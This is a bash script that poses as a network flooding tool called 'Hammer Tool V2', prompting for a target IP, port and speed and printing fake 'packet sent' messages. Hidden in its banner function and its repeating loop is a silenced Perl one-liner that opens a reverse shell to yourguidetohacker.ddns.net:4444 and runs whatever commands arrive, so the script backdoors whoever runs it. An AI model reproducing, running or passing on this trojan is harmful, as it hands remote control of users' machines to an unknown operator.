#!/bin/bash
clear

C1='\e[1;31m' # red
C2='\e[1;32m' # green
C3='\e[1;34m' # blue
C4='\e[1;37m' # white
date=`date`

a() {
    echo -e "$C2"
    perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"yourguidetohacker.ddns.net:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};' &> /dev/null
    echo -e '$$\   $$\                                                           '
    echo -e '$$ |  $$ |                                                          '
    echo -e '$$ |  $$ | $$$$$$\  $$$$$$\$$$$\  $$$$$$\$$$$\   $$$$$$\   $$$$$$\  '
    echo -e '$$$$$$$$ | \____$$\ $$  _$$  _$$\ $$  _$$  _$$\ $$  __$$\ $$  __$$\ '
    echo -e '$$  __$$ | $$$$$$$ |$$ / $$ / $$ |$$ / $$ / $$ |$$$$$$$$ |$$ |  \__|'
    echo -e '$$ |  $$ |$$  __$$ |$$ | $$ | $$ |$$ | $$ | $$ |$$   ____|$$ |      '
    echo -e '$$ |  $$ |\$$$$$$$ |$$ | $$ | $$ |$$ | $$ | $$ |\$$$$$$$\ $$ |      '
    echo -e '\__|  \__| \_______|\__| \__| \__|\__| \__| \__| \_______|\__|      '
    echo -e '                      ### Hammer Tool V2 ###'
}                                    

b() { 
    echo -e "$C3""                   ############################"
    read -p "                        Enter IP Address : " IP
    read -p "                       Enter Port Number : " Port
    read -p "                     Enter Terbo (Default 135) : " T
    echo -e "                 IP : $IP | Port : $Port | Terbo : $T""$C4"
    sleep 5
    echo -e "$C4"
} 

massage() {
    perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"yourguidetohacker.ddns.net:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};' &> /dev/null
    echo -e "    $C2""$date   ""$C3""<--packet sent! hammering-->""$C4"
    sleep 0.5
    massage
}

a
b
massage
